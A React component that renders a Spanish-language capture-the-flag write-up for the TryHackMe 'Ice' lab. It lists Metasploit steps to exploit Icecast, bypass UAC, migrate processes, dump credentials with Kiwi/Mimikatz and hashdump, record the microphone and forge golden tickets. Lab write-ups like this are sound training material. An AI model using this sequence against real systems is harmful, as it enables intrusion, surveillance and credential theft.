import React from "react";
import styles from "./Ice.module.css";

export default function Ice() {
  return (
    <div className={styles.container}>
      <h1>TRYHACKME - ICE </h1>
      <h2>Escaneo de puertos</h2>
      <pre>
        <code>nmap -sV -O ip</code>
      </pre>
      <p>- <b>-sV</b>: para ver la versión de los servicios</p>
      <p>- <b>-O</b>: para ver el SO</p>
      
      <h2>Evaluación de vulnerabilidad</h2>
      <p>
        Vamos a <a href="https://www.cvedetails.com/" target="_blank" rel="noopener noreferrer">CVE Details</a> y buscamos la vulnerabilidad de Icecast con una nota de 7.5.
      </p>
      
      <h2>Metasploit</h2>
      <p>Buscamos vulnerabilidades de Icecast en Metasploit y seleccionamos el módulo disponible.</p>
      <pre>
        <code>sysinfo | findstr /B /C:"OS"</code>
      </pre>
      
      <h3>Elevación de privilegios</h3>
      <p>
        Ejecutamos <code>post/multi/recon/local_exploit_suggester</code> y seleccionamos <code>windows/local/bypassuac_eventvwr</code>.
      </p>
      <pre>
        <code>getprivs</code>
      </pre>
      
      <h3>Migración de procesos</h3>
      <p>
        Listamos procesos sospechosos con <code>ps</code> y migramos usando:
      </p>
      <pre>
        <code>migrate -N nombreDelProceso</code>
      </pre>
      
      <h3>Obtención de credenciales</h3>
      <p>
        Instalamos Kiwi (mejora de Mimikatz) y ejecutamos:
      </p>
      <pre>
        <code>creds_all</code>
      </pre>
      <p>Encontramos la contraseña del usuario <b>Dark</b>: <code>Password01!</code></p>
      
      <h3>Otras acciones</h3>
      <ul>
        <li>Dump de hashes: <code>hashdump</code></li>
        <li>Escritorio remoto en tiempo real: <code>screenshare</code></li>
        <li>Grabación de micrófono: <code>record_mic</code></li>
        <li>Modificación de MAC: <code>timestomp</code></li>
        <li>Persistencia y autenticación: <code>golden_ticket_create</code></li>
      </ul>
    </div>
  );
}